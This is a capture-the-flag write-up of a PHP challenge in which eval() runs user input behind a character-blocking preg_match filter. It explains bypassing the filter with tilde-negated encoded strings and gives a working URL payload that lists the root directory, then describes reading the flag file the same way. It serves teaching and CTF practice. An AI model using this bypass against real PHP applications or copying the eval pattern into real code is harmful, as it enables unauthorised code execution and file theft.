
## My Little WAF

**Description:** - <br>
**Target:** http://103.250.10.198:10001 <br>
**Category:** eval() execution, preg_match() bypass

## Steps
The site showed the index.php source code
```
<?php  
if (isset($_GET['cmd'])) {  
$cmd = $_GET['cmd'];  

	if(preg_match("/[a-z0-9\s_$`]/i", $cmd) || strlen($cmd) > 0x50) { 
		echo  "Blocked!"; 
	} else { 
		eval($cmd); 
	}
} else {
	highlight_file(__FILE__);
}
?>
```
From the source code and title, we know that the objective of this challenge is to leverage `eval()` in PHP to gain code execution. We will use `cmd` parameter at the end of the URL. The problem is that the preg_match function only allows certain characters.

However, we can use this php trick and construct a code execution, <br>
![image](https://user-images.githubusercontent.com/63649797/194979320-1b777497-ca15-4372-8f1f-af343e66894d.png) <br>
The tilde (~) here is a binary negation operator (two's complement arithmatic), which inverses all the bits of its operand. Image below may explains. <br>
![image](https://user-images.githubusercontent.com/63649797/195051287-d87323c7-75bb-43d7-82e8-e91a4e5e8828.png)

![image](https://user-images.githubusercontent.com/63649797/194879267-340b0876-276e-4bce-b047-c324fd31e82a.png) <br>
Hence, we can construct a code execution like above, which is the same as ``print_r(scandir(“/”));``
```
http://103.250.10.198:10001/?cmd=(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)(~%D0))%3B
```
![image](https://user-images.githubusercontent.com/63649797/194879547-6bf17ebc-cb43-40fb-997e-643d22901851.png) <br>
Then we can do the same again for ``readfile(“/fl44gg”);``

```
Flag: Fostifest{REDACTED}
```

## References
https://stackoverflow.com/questions/9129744/whats-the-function-of-the-bitwise-operator-tilde

## Unanswered question
If both the url encoded and decoded contains alphanumeric, how did it bypass the preg_match?
